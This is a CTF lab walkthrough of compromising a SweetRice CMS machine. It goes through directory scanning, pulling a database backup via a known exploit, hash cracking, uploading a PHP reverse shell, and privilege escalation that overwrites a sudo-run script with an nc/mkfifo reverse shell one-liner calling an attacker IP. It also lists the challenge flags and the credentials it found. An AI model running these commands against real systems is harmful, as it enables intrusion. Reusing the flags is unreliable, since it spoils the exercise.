Checked the IP in a browser.

'View Page Source' reveals a commented link to a vulnerabilty
    https://launchpad.net/bugs/1288690
    
Ran nmap-dirsearch.sh script
        Open Ports:
        22
        80
        Directories:
        /content/
        
Navigated to /content/
    'View Page Source' shows the SweetRice is used as website management system
    Also shows that there is an additional directory /content/js
        Navigating there shows a few Javascript files
    
Ran gobuster scan to try and find additional subdirectories
    No additional directories found
    
Trying to find an explot for SweetRice

Exploit-DB shows multiples

I will try to get the backups off the server since it is the easiest to try first.
    https://www.exploit-db.com/exploits/40718
    
I follow the instructions and get Not Found.
    I tried again but added the /content/ back in.
        The new url works and I see there is a .sql file. 
        I download the file and open it in a text editor.
        Ctrl F to search the file.
            I search "pass" and find what looks like a hashed password.
            Right above that is "admin" and "manager".
            So I assume I have the username and password hash.
            
I use hashcat to crack the hashed password.
    hashcat -a 0 -m 0 hashfile.txt wordlist.txt -o outputfile.txt
        The password comes back as Password123
        
I tried the combo on ssh but it says the password is incorrect.

Ran a dirb scan to try and find more directories as a last resort.
    dirb http://IPADDRESS -R
        found additional /content/ directories
            _themes
            as
            attachment
            images
            inc
            js
            
Started entering them into the address bar to see what they have.

/content/as/ has a login page!

Entered in the credentials I found. They worked!
    It has taken to to the SweetRice dashboard
    
Looking through the options I found additional creds for the mysql database:
    account - rice
    password - randompass
    
The 'Data Import' tab allows me to upload a file. I am going to try and upload a php reverse shell script.
    phpreverseshell.php
    
When I navigate back to the /content/inc/mysql_backup page my script is in there.

Time to start up a listener.
    nc -nlvp 4444
    
Run the script and I get a reverse shell!

ls to see our directories and files

cd into the /home directory

ls again.

A single directory called itguy

cd into that directory

ls aaagain

There's the first flag. user.txt
    cat user.txt
        THM{63e5bce9271952aad1113b6f1ac28a07}

Now to escalate privileges.

sudo -l to see what I can do. /usr/bin/backup.pl is a perl file I am allowed to run.
    #!/usr/bin/perl

    system("sh", "/etc/copy.sh");
    
The file isn't writeable but it runs another script. I check that one.
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPADDRESS 5554 >/tmp/f
    
Looks like I just need to change the IP address. I can not get any text editor to work. I guess I will just echo it.
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.1.204 5554 >/tmp/f" > /etc/copy.sh

Set up anpther listener on the attacking machine 
    nc -nlvp 5554
    
Run the command to execute
    sudo /usr/bin/perl /home/itguy/backup.pl
    
Opens up the privileged shell on the listener.

cd /root

ls to list files

cat root.txt for the final flag
    THM{6637f41d0177b6f37cb20d775124699f}


